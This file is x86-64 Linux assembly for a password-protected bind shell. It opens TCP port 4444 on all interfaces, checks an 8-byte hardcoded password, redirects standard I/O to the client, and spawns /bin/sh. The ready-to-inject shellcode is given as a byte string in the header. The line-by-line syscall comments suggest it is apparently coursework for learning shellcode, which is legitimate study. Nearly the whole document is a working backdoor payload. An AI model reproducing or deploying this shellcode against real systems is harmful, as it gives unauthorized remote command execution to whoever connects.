; Author: Robert Catalin Raducioiu
; Shellcode: "\x48\x31\xf6\x48\xf7\xe6\x52\x5f\x48\x83\xc7\x02\x48\xff\xc6\x83\xc0\x29\x0f\x05\x48\x97\xbe\xff\xff\x11\x5c\x66\x83\xf6\xfd\x56\x48\x89\xe6\x49\x89\xf2\x83\xc2\x10\x31\xc0\x48\x83\xc0\x31\x0f\x05\x48\x31\xf6\x48\xf7\xe6\x48\xff\xc6\x83\xc0\x32\x0f\x05\x31\xc0\x48\x89\xc6\x83\xc0\x2b\x0f\x05\x48\x89\xc7\x48\x83\xc2\x08\x48\x29\xd4\x48\x89\xe6\x31\xc0\x0f\x05\x5b\x48\xb8\x72\x62\x63\x74\x21\x32\x32\x0a\x48\x31\xd8\x74\x07\x31\xc0\x83\xc0\x3c\x0f\x05\x31\xc9\x48\xf7\xe1\x83\xc1\x02\x51\x52\x58\x83\xc0\x21\x48\x89\xce\x0f\x05\x59\x48\xff\xc9\x79\xef\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x83\xc0\x3b\x0f\x05";
; Shellcode length: 

global _start

section .text

_start:

CreateSocket:

    ; clear registers for later usage
    xor rsi, rsi
    mul rsi

    ; 1st argument of socket(): communication domain
    ; in this case AF_INET, so it's based upon the IPv4 protocol
    push rdx
    pop rdi
    add rdi, 2
    
    ; 2nd argument of socket(): type of socket
    ; in this case: SOCK_STREAM, which means it uses the TCP protocol
    inc rsi

    ; 3rd argument: https://stackoverflow.com/questions/3735773/what-does-0-indicate-in-socket-system-call

    ; Syscall socket()
    add eax, 41

    ; create socket and save the resulting file descriptor inside RAX
    syscall
    ; after running syscall, I noticed the following 'file':
    ; lrwx------ 1 kali kali 64 Feb 28 16:16 /proc/43453/fd/3 -> 'socket:[608794]'
    ; thus the socket was created successfully

BindSocket:

    ; save file descriptor inside RSI
    ; 1st argument of bind(): file descriptor of the socket to bind
    xchg rax, rdi

    ; INADDR_ANY (0x00000000)
    ; TCP port 4444
    ; 0x00002 -> AF_INET
    mov esi, 0x5c11ffff
    xor si, 0xfffd
    push rsi

    ; 2nd argument of bind(): pointer to the sock_addr struct
    mov rsi, rsp
    mov r10, rsi

    ; 3rd argument of bind(): size of the struct
    add edx, 16

    ; Syscall bind()
    xor eax, eax
    add rax, 49

    ; bind socket to 0.0.0.0:4444
    syscall

Listen:

    ; 2nd argument of listen(): backlog (number of connections to accept), in this case just 1
    xor rsi, rsi
    mul rsi
    inc rsi

    ; 1st argument of listen(): file descriptor of the socket
    ; the value is already stored inside RDI

    ; syscall listen()
    add eax, 50

    ; call listen(fd, 1)
    syscall

AcceptIncomingConnection:

    ; 2nd and 3rd arguments of accept(): NULL and NULL
    ; according to the man pages, we can use this approach when
    ; we don't care about the address of the client
    xor eax, eax
    mov rsi, rax
    ; 1st argument should be unchanged

    ; syscall accept()
    add eax, 43

    ; invoke accept()
    syscall

    ; save file descriptor of the client socket for later usage (dup2)
    mov rdi, rax

CheckPassword:

    ; 3rd argument of read(): number of bytes to read
    add rdx, 8

    ; allocate 8 bytes on the stack for storing the password
    sub rsp, rdx

    ; 2nd argument of read(): pointer to buffer which will store the
    ; bytes received from the client
    mov rsi, rsp

    ; 1st argument of read() (client socket) shoud be unchanged (RDI)

    ; syscall read()
    xor eax, eax

    ; call read()
    syscall

    pop rbx
    mov rax, 0x0a32322174636272
    xor rax, rbx
    jz IO_Redirection

ExitWrongPassword:

    xor eax, eax
    add eax, 60
    syscall

IO_Redirection:

    xor ecx, ecx
    mul rcx
    add ecx, 2

DuplicateFileDescriptor:

    ; 1st argument of dup2(), file descriptor of the client socket, should be unchanged (RDI)
    ; 2nd argument of dup2(): file descriptor to redirect: stdin/stdout/stderr
    ; in this case the value is stored inside RCX -> 2,1,0
    push rcx
    
    ; syscall: dup2()
    push rdx
    pop rax
    add eax, 33

    ; 2nd argument of dup2(): file descriptor to redirect
    mov rsi, rcx

    ; call dup2()
    syscall

    pop rcx
    dec rcx
    jns DuplicateFileDescriptor

SpawnSystemShell:

    ; clear RAX register (zero-sign extended)
    xor eax, eax

    ; NULL terminator for the string below
    push rax

    ; 3rd argument of execve: envp (in this case a pointer to NULL)
    mov rdx, rsp

    ; string "/bin//sh"
    mov rbx, 0x68732f2f6e69622f
    push rbx

    ; 1st argument of execve: executable to run
    mov rdi, rsp

    ; 2nd argument of execve: array of arguments passed to the executable
    push rax

    push rdi
    mov rsi, rsp

    ; syscall execve
    add eax, 0x3b

    ; invoke execve
    syscall
